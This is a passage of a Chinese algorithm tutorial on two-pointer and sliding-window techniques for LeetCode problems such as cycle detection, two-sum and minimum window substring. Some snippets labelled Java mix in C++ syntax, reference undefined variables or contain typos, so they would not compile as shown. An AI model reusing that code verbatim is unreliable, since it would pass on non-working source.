class="hljs-keyword">if</span> (fast == slow) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// 上面的代码类似 hasCycle 函数</span><br>    <span class="hljs-keyword">if</span> (fast == <span class="hljs-keyword">null</span> || fast.next == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">// fast 遇到空指针说明没有环</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    slow = head;<br>    <span class="hljs-keyword">while</span> (slow != fast) &#123;<br>        fast = fast.next;<br>        slow = slow.next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> slow;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，当快慢指针相遇时，让其中任一个指针指向头节点，然后让它俩以相同速度前进，再次相遇时所在的节点位置就是环开始的位置。这是为什么呢？</p><p>第一次相遇时，假设慢指针 <code>slow</code> 走了 <code>k</code> 步，那么快指针 <code>fast</code> 一定走了 <code>2k</code> 步：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针1.jpg" alt="img" style="zoom:50%;" /></p><p><strong><code>fast</code></strong> <strong>一定比</strong> <strong><code>slow</code></strong> <strong>多走了</strong> <strong><code>k</code></strong> <strong>步，这多走的</strong> <strong><code>k</code></strong> <strong>步其实就是</strong> <strong><code>fast</code></strong> <strong>指针在环里转圈圈，所以</strong> <strong><code>k</code></strong> <strong>的值就是环长度的「整数倍」</strong>。</p><p>说句题外话，之前还有读者争论为什么是环长度整数倍，我举个简单的例子你就明白了，我们想一想极端情况，假设环长度就是 1，如下图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针2.jpg" alt="img" style="zoom:50%;" /></p><p>那么 <code>fast</code> 肯定早早就进环里转圈圈了，而且肯定会转好多圈，这不就是环长度的整数倍嘛。</p><p>言归正传，设相遇点距环的起点的距离为 <code>m</code>，那么环的起点距头结点 <code>head</code> 的距离为 <code>k - m</code>，也就是说如果从 <code>head</code> 前进 <code>k - m</code> 步就能到达环起点。</p><p>巧的是，如果从相遇点继续前进 <code>k - m</code> 步，也恰好到达环起点。你甭管 <code>fast</code> 在环里到底转了几圈，反正走 <code>k</code> 步可以到相遇点，那走 <code>k - m</code> 步一定就是走到环起点了：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针3.jpg" alt="img" style="zoom:50%;" /></p><p>所以，只要我们把快慢指针中的任一个重新指向 <code>head</code>，然后两个指针同速前进，<code>k - m</code> 步后就会相遇，相遇之处就是环的起点了。</p><p><strong>3、寻找链表的中点</strong></p><p>类似上面的思路，我们还可以让快指针一次前进两步，慢指针一次前进一步，当快指针到达链表尽头时，慢指针就处于链表的中间位置。</p><p>力扣第 876 题就是找链表中点的题目，解法代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">ListNode <span class="hljs-title">middleNode</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    ListNode fast, slow;<br>    fast = slow = head;<br>    <span class="hljs-keyword">while</span> (fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>) &#123;<br>        fast = fast.next.next;<br>        slow = slow.next;<br>    &#125;<br>    <span class="hljs-comment">// slow 就在中间位置</span><br>    <span class="hljs-keyword">return</span> slow;<br>&#125;<br></code></pre></td></tr></table></figure><p>当链表的长度是奇数时，<code>slow</code> 恰巧停在中点位置；如果长度是偶数，<code>slow</code> 最终的位置是中间偏右：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针4.jpg" alt="img" style="zoom:50%;" /></p><p>寻找链表中点的一个重要作用是对链表进行归并排序。</p><p>回想数组的归并排序：求中点索引递归地把数组二分，最后合并两个有序数组。对于链表，合并两个有序链表是很简单的，难点就在于二分。</p><p>但是现在你学会了找到链表的中点，就能实现链表的二分了。关于归并排序的具体内容本文就不具体展开了。</p><p><strong>4、寻找链表的倒数第</strong> <strong><code>n</code></strong> <strong>个元素</strong></p><p>这是力扣第 19 题「删除链表的倒数第 <code>n</code> 个元素」，先看下题目：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针5.jpg" alt="img" style="zoom:50%;" /></p><p>我们的思路还是使用快慢指针，让快指针先走 <code>n</code> 步，然后快慢指针开始同速前进。这样当快指针走到链表末尾 <code>null</code> 时，慢指针所在的位置就是倒数第 <code>n</code> 个链表节点（<code>n</code> 不会超过链表长度）。</p><p>解法比较简单，直接看代码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">ListNode <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode head, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    ListNode fast, slow;<br>    fast = slow = head;<br>    <span class="hljs-comment">// 快指针先前进 n 步</span><br>    <span class="hljs-keyword">while</span> (n-- &gt; <span class="hljs-number">0</span>) &#123;<br>        fast = fast.next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fast == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">// 如果此时快指针走到头了，</span><br>        <span class="hljs-comment">// 说明倒数第 n 个节点就是第一个节点</span><br>        <span class="hljs-keyword">return</span> head.next;<br>    &#125;<br>    <span class="hljs-comment">// 让慢指针和快指针同步向前</span><br>    <span class="hljs-keyword">while</span> (fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>) &#123;<br>        fast = fast.next;<br>        slow = slow.next;<br>    &#125;<br>    <span class="hljs-comment">// slow.next 就是倒数第 n 个节点，删除它</span><br>    slow.next = slow.next.next;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-左右指针的常用算法"><a href="#2-2-左右指针的常用算法" class="headerlink" title="2.2 左右指针的常用算法"></a>2.2 左右指针的常用算法</h2><p>左右指针在数组中实际是指两个索引值，一般初始化为 <code>left = 0, right = nums.length - 1</code> 。</p><p><strong>1、二分查找</strong></p><p>前文 <a href="">二分查找框架详解</a> 有详细讲解，这里只写最简单的二分算法，旨在突出它的双指针特性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">binarySearch</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = (right + left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(nums[mid] == target)<br>            <span class="hljs-keyword">return</span> mid; <br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target)<br>            left = mid + <span class="hljs-number">1</span>; <br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target)<br>            right = mid - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2、两数之和</strong></p><p>直接看力扣第 167 题「两数之和 II」吧：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/两数之和.jpg" alt="img" style="zoom:67%;" /></p><p>只要数组有序，就应该想到双指针技巧。这道题的解法有点类似二分查找，通过调节 <code>left</code> 和 <code>right</code> 可以调整 <code>sum</code> 的大小：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-keyword">int</span> sum = nums[left] + nums[right];<br>        <span class="hljs-keyword">if</span> (sum == target) &#123;<br>            <span class="hljs-comment">// 题目要求的索引是从 1 开始的</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;left + <span class="hljs-number">1</span>, right + <span class="hljs-number">1</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sum &lt; target) &#123;<br>            left++; <span class="hljs-comment">// 让 sum 大一点</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sum &gt; target) &#123;<br>            right--; <span class="hljs-comment">// 让 sum 小一点</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3、反转数组</strong></p><p>一般编程语言都会提供 <code>reverse</code> 函数，其实非常简单，力扣第 344 题是类似的需求，让你反转一个 <code>char[]</code> 类型的字符数组，我们直接看代码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reverse</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-comment">// swap(nums[left], nums[right])</span><br>        <span class="hljs-keyword">int</span> temp = nums[left];<br>        nums[left] = nums[right];<br>        nums[right] = temp;<br>        left++; right--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-滑动窗口技巧"><a href="#3-滑动窗口技巧" class="headerlink" title="3. 滑动窗口技巧"></a>3. 滑动窗口技巧</h1><p>关于双指针的快慢指针和左右指针的用法，可以参见前文 <a href="">双指针技巧汇总</a>，本文就解决一类最难掌握的双指针技巧：滑动窗口技巧。总结出一套框架，可以保你闭着眼睛都能写出正确的解法。</p><p>说起滑动窗口算法，很多读者都会头疼。这个算法技巧的思路非常简单，就是维护一个窗口，不断滑动，然后更新答案么。LeetCode 上有起码 10 道运用滑动窗口算法的题目，难度都是中等和困难。该算法的大致逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span> (right &lt; s.size()) &#123;`<br>    <span class="hljs-comment">// 增大窗口</span><br>    window.add(s[right]);<br>    right++;<br><br>    <span class="hljs-keyword">while</span> (window needs shrink) &#123;<br>        <span class="hljs-comment">// 缩小窗口</span><br>        window.remove(s[left]);<br>        left++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个算法技巧的时间复杂度是 O(N)，比字符串暴力算法要高效得多。</p><p>其实困扰大家的，不是算法的思路，而是各种细节问题。比如说如何向窗口中添加新元素，如何缩小窗口，在窗口滑动的哪个阶段更新结果。即便你明白了这些细节，也容易出 bug，找 bug 还不知道怎么找，真的挺让人心烦的。</p><p><strong>所以今天我就写一套滑动窗口算法的代码框架，我连再哪里做输出 debug 都给你写好了，以后遇到相关的问题，你就默写出来如下框架然后改三个地方就行，还不会出 bug</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 滑动窗口算法框架 */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">slidingWindow</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>    unordered_map&lt;<span class="hljs-keyword">char</span>, <span class="hljs-keyword">int</span>&gt; need, window;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : t) need[c]++;<br><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">while</span> (right &lt; s.size()) &#123;<br>        <span class="hljs-comment">// c 是将移入窗口的字符</span><br>        <span class="hljs-keyword">char</span> c = s[right];<br>        <span class="hljs-comment">// 右移窗口</span><br>        right++;<br>        <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>        ...<br><br>        <span class="hljs-comment">/*** debug 输出的位置 ***/</span><br>        printf(<span class="hljs-string">&quot;window: [%d, %d)\n&quot;</span>, left, right);<br>        <span class="hljs-comment">/********************/</span><br><br>        <span class="hljs-comment">// 判断左侧窗口是否要收缩</span><br>        <span class="hljs-keyword">while</span> (window needs shrink) &#123;<br>            <span class="hljs-comment">// d 是将移出窗口的字符</span><br>            <span class="hljs-keyword">char</span> d = s[left];<br>            <span class="hljs-comment">// 左移窗口</span><br>            left++;<br>            <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>            ...<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>其中两处</strong> <strong><code>...</code></strong> <strong>表示的更新窗口数据的地方，到时候你直接往里面填就行了</strong>。</p><p>而且，这两个 <code>...</code> 处的操作分别是右移和左移窗口更新操作，等会你会发现它们操作是完全对称的。</p><p>说句题外话，我发现很多人喜欢执着于表象，不喜欢探求问题的本质。比如说有很多人评论我这个框架，说什么散列表速度慢，不如用数组代替散列表；还有很多人喜欢把代码写得特别短小，说我这样代码太多余，影响编译速度，LeetCode 上速度不够快。</p><p>我服了。算法看的是时间复杂度，你能确保自己的时间复杂度最优，就行了。至于 LeetCode 所谓的运行速度，那个都是玄学，只要不是慢的离谱就没啥问题，根本不值得你从编译层面优化，不要舍本逐末……</p><p>labuladong 公众号的重点在于算法思想，你把框架思维了然于心，然后随你魔改代码好吧，你高兴就好。</p><p>言归正传，下面就直接上<strong>四道</strong> LeetCode 原题来套这个框架，其中第一道题会详细说明其原理，后面四道就直接闭眼睛秒杀了。</p><p>本文代码为 C++ 实现，不会用到什么编程方面的奇技淫巧，但是还是简单介绍一下一些用到的数据结构，以免有的读者因为语言的细节问题阻碍对算法思想的理解：</p><p><code>unordered_map</code> 就是哈希表（字典），它的一个方法 <code>count(key)</code> 相当于 Java 的 <code>containsKey(key)</code> 可以判断键 key 是否存在。</p><p>可以使用方括号访问键对应的值 <code>map[key]</code>。需要注意的是，如果该 <code>key</code> 不存在，C++ 会自动创建这个 key，并把 <code>map[key]</code> 赋值为 0。</p><p>所以代码中多次出现的 <code>map[key]++</code> 相当于 Java 的 <code>map.put(key, map.getOrDefault(key, 0) + 1)</code>。</p><h2 id="3-1-最小覆盖子串"><a href="#3-1-最小覆盖子串" class="headerlink" title="3.1 最小覆盖子串"></a>3.1 最小覆盖子串</h2><p>LeetCode 76 题，Minimum Window Substring，难度 Hard：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/title1.png" style="zoom: 67%;" /></p><p>就是说要在 <code>S</code>(source) 中找到包含 <code>T</code>(target) 中全部字母的一个子串，且这个子串一定是所有可能子串中最短的。</p><p>如果我们使用暴力解法，代码大概是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; s.<span class="hljs-built_in">size</span>(); j++)<br>        <span class="hljs-keyword">if</span> s[i:j] 包含 t 的所有字母:<br>            更新答案<br></code></pre></td></tr></table></figure><p>思路很直接，但是显然，这个算法的复杂度肯定大于 O(N^2) 了，不好。</p><p><strong>滑动窗口算法的思路是这样</strong>：</p><p>1、我们在字符串 <code>S</code> 中使用双指针中的左右指针技巧，初始化 <code>left = right = 0</code>，把索引<strong>左闭右开</strong>区间 <code>[left, right)</code> 称为一个「窗口」。</p><p>2、我们先不断地增加 <code>right</code> 指针扩大窗口 <code>[left, right)</code>，直到窗口中的字符串符合要求（包含了 <code>T</code> 中的所有字符）。</p><p>3、此时，我们停止增加 <code>right</code>，转而不断增加 <code>left</code> 指针缩小窗口 <code>[left, right)</code>，直到窗口中的字符串不再符合要求（不包含 <code>T</code> 中的所有字符了）。同时，每次增加 <code>left</code>，我们都要更新一轮结果。</p><p>4、重复第 2 和第 3 步，直到 <code>right</code> 到达字符串 <code>S</code> 的尽头。</p><p>这个思路其实也不难，<strong>第 2 步相当于在寻找一个「可行解」，然后第 3 步在优化这个「可行解」，最终找到最优解，</strong>也就是最短的覆盖子串。左右指针轮流前进，窗口大小增增减减，窗口不断向右滑动，这就是「滑动窗口」这个名字的来历。</p><p>下面画图理解一下，<code>needs</code> 和 <code>window</code> 相当于计数器，分别记录 <code>T</code> 中字符出现次数和「窗口」中的相应字符的出现次数。</p><p>初始状态：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1.png" alt="img" style="zoom:50%;" /></p><p>增加 <code>right</code>，直到窗口 <code>[left, right]</code> 包含了 <code>T</code> 中所有字符：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/2.png" alt="img" style="zoom:50%;" /></p><p>现在开始增加 <code>left</code>，缩小窗口 <code>[left, right]</code>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.png" alt="img" style="zoom: 50%;" /></p><p>直到窗口中的字符串不再符合要求，<code>left</code> 不再继续移动。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/4.png" alt="img" style="zoom:50%;" /></p><p>之后重复上述过程，先移动 <code>right</code>，再移动 <code>left</code>…… 直到 <code>right</code> 指针到达字符串 <code>S</code> 的末端，算法结束。</p><p>如果你能够理解上述过程，恭喜，你已经完全掌握了滑动窗口算法思想。<strong>现在我们来看看这个滑动窗口代码框架怎么用</strong>：</p><p>首先，初始化 <code>window</code> 和 <code>need</code> 两个哈希表，记录窗口中的字符和需要凑齐的字符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Character, Integer&gt; need, window;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : t) need.put(c, map.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>然后，使用 <code>left</code> 和 <code>right</code> 变量初始化窗口的两端，不要忘了，区间 <code>[left, right)</code> 是左闭右开的，所以初始情况下窗口没有包含任何元素：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">while</span> (right &lt; s.length()) &#123;<br>    <span class="hljs-comment">// 开始滑动</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>其中</strong> <strong><code>valid</code></strong> <strong>变量表示窗口中满足</strong> <strong><code>need</code></strong> <strong>条件的字符个数</strong>，如果 <code>valid</code> 和 <code>need.size</code> 的大小相同，则说明窗口已满足条件，已经完全覆盖了串 <code>T</code>。</p><p><strong>现在开始套模板，只需要思考以下四个问题</strong>：</p><p>1、当移动 <code>right</code> 扩大窗口，即加入字符时，应该更新哪些数据？</p><p>2、什么条件下，窗口应该暂停扩大，开始移动 <code>left</code> 缩小窗口？</p><p>3、当移动 <code>left</code> 缩小窗口，即移出字符时，应该更新哪些数据？</p><p>4、我们要的结果应该在扩大窗口时还是缩小窗口时进行更新？</p><p>如果一个字符进入窗口，应该增加 <code>window</code> 计数器；如果一个字符将移出窗口的时候，应该减少 <code>window</code> 计数器；当 <code>valid</code> 满足 <code>need</code> 时应该收缩窗口；应该在收缩窗口的时候更新最终结果。</p><p>下面是完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">minWindow</span><span class="hljs-params">(String s, String t)</span> </span>&#123;<br>    HashMap&lt;Character, Integer&gt; window = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    HashMap&lt;Character, Integer&gt; need = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c : t.toCharArray())&#123;<br>        need.put(c, need.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> start = <span class="hljs-number">0</span>, len = Integer.MAX_VALUE;<br>    <span class="hljs-keyword">while</span>(right &lt; s.length())&#123;<br>        <span class="hljs-keyword">char</span> c = s.charAt(right);<br>        right++;<br>        <span class="hljs-keyword">if</span>(need.containsKey(c))&#123;<br>            window.put(c, window.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(window.get(c).equals(need.get(c)))&#123;<br>                valid++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(valid == need.size())&#123;<br>            <span class="hljs-keyword">if</span>(right - left &lt; len)&#123;<br>                start = left;<br>                len = right - left;<br>            &#125;<br>            <span class="hljs-keyword">char</span> d = s.charAt(left);<br>            left++;<br>            <span class="hljs-keyword">if</span>(need.containsKey(d))&#123;<br>                <span class="hljs-keyword">if</span>(window.get(d).equals(need.get(d)))&#123;<br>                    valid--;<br>                &#125;<br>                window.put(d, window.get(d) - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len == Integer.MAX_VALUE ? <span class="hljs-string">&quot;&quot;</span> : s.substring(start, start + len);<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，当我们发现某个字符在 <code>window</code> 的数量满足了 <code>need</code> 的需要，就要更新 <code>valid</code>，表示有一个字符已经满足要求。而且，你能发现，两次对窗口内数据的更新操作是完全对称的。</p><p>当 <code>valid == need.size()</code> 时，说明 <code>T</code> 中所有字符已经被覆盖，已经得到一个可行的覆盖子串，现在应该开始收缩窗口了，以便得到「最小覆盖子串」。</p><p>移动 <code>left</code> 收缩窗口时，窗口内的字符都是可行解，所以应该在收缩窗口的阶段进行最小覆盖子串的更新，以便从可行解中找到长度最短的最终结果。</p><p>至此，应该可以完全理解这套框架了，滑动窗口算法又不难，就是细节问题让人烦得很。<strong>以后遇到滑动窗口算法，你就按照这框架写代码，保准没有 bug，还省事儿</strong>。</p><p>下面就直接利用这套框架秒杀几道题吧，你基本上一眼就能看出思路了。</p><h2 id="3-2-字符串排列"><a href="#3-2-字符串排列" class="headerlink" title="3.2 字符串排列"></a>3.2 字符串排列</h2><p>LeetCode 567 题，Permutation in String，难度 Medium：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/title2.png" alt="img" style="zoom:67%;" /></p><p>注意哦，输入的 <code>s1</code> 是可以包含重复字符的，所以这个题难度不小。</p><p>这种题目，是明显的滑动窗口算法，<strong>相当给你一个</strong> <strong><code>S</code></strong> <strong>和一个</strong> <strong><code>T</code></strong>，请问你 <strong><code>S</code></strong> <strong>中是否存在一个子串，包含</strong> <strong><code>T</code></strong> <strong>中所有字符且不包含其他字符</strong>？</p><p>首先，先复制粘贴之前的算法框架代码，然后明确刚才提出的 4 个问题，即可写出这道题的答案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 判断 s 中是否存在 t 的排列</span><br><span class="hljs-function">bool <span class="hljs-title">checkInclusion</span><span class="hljs-params">(string t, string s)</span> </span>&#123;<br>    HashMap&lt;Character, Integer&gt; need, window;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : t)&#123;<br>        need.put(c, map.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125; <br><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (right &lt; s.length()) &#123;<br>        <span class="hljs-comment">// c 是将移入窗口的字符</span><br>        <span class="hljs-keyword">char</span> c = s[right];<br>        <span class="hljs-comment">// 右移窗口</span><br>        right++;<br>        <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>        <span class="hljs-keyword">if</span> (need.contains(c)) &#123;<br>            windows.put(c, map.getOrDefault(c, <span class="hljs-number">0</span>) + <span 